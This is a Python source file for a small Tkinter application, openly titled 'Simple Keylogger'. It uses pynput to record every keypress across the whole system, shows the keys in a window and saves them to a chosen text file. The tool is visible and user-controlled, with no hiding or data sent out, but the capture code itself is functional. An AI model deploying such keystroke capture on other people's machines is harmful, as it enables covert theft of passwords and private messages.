import tkinter as tk
from tkinter import scrolledtext, messagebox, filedialog
from pynput import keyboard
import threading
from datetime import datetime

class KeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Simple Keylogger")
        self.root.geometry("600x400")
        self.root.resizable(False, False)

        self.is_logging = False
        self.log = ""
        self.listener = None
        self.log_file = None

        self.create_widgets()

    def create_widgets(self):
        # Frame for buttons
        btn_frame = tk.Frame(self.root)
        btn_frame.pack(pady=10)

        self.start_btn = tk.Button(btn_frame, text="Start Logging", width=15, command=self.start_logging)
        self.start_btn.grid(row=0, column=0, padx=10)

        self.stop_btn = tk.Button(btn_frame, text="Stop Logging", width=15, state='disabled', command=self.stop_logging)
        self.stop_btn.grid(row=0, column=1, padx=10)

        self.save_btn = tk.Button(btn_frame, text="Save Log", width=15, state='disabled', command=self.save_log)
        self.save_btn.grid(row=0, column=2, padx=10)

        # Scrolled text for showing captured keys
        self.text_area = scrolledtext.ScrolledText(self.root, width=70, height=20, font=("Consolas", 12))
        self.text_area.pack(padx=10, pady=10)
        self.text_area.config(state='disabled')

    def on_press(self, key):
        try:
            self.log += f"{key.char}"
            self.update_text(f"{key.char}")
        except AttributeError:
            # Special keys (space, enter, etc)
            if key == keyboard.Key.space:
                self.log += " "
                self.update_text(" ")
            elif key == keyboard.Key.enter:
                self.log += "\n"
                self.update_text("\n")
            elif key == keyboard.Key.tab:
                self.log += "\t"
                self.update_text("\t")
            else:
                self.log += f" [{key.name}] "
                self.update_text(f" [{key.name}] ")

    def update_text(self, char):
        self.text_area.config(state='normal')
        self.text_area.insert(tk.END, char)
        self.text_area.see(tk.END)
        self.text_area.config(state='disabled')

    def start_logging(self):
        if not self.is_logging:
            # Prompt to choose log file
            self.log_file = filedialog.asksaveasfilename(defaultextension=".txt",
                                                         filetypes=[("Text files", "*.txt")],
                                                         title="Select Log File")
            if not self.log_file:
                return

            self.is_logging = True
            self.log = ""
            self.text_area.config(state='normal')
            self.text_area.delete(1.0, tk.END)
            self.text_area.config(state='disabled')

            self.start_btn.config(state='disabled')
            self.stop_btn.config(state='normal')
            self.save_btn.config(state='disabled')

            # Start listener in a separate thread to avoid blocking the UI
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.update_text(f"[Logging started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")

    def stop_logging(self):
        if self.is_logging:
            self.listener.stop()
            self.is_logging = False
            self.start_btn.config(state='normal')
            self.stop_btn.config(state='disabled')
            self.save_btn.config(state='normal')
            self.update_text(f"\n[Logging stopped at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")

    def save_log(self):
        if self.log_file:
            try:
                with open(self.log_file, 'a', encoding='utf-8') as file:
                    file.write(self.log)
                messagebox.showinfo("Success", f"Log saved successfully to:\n{self.log_file}")
                self.save_btn.config(state='disabled')
            except Exception as e:
                messagebox.showerror("Error", f"Could not save log:\n{e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
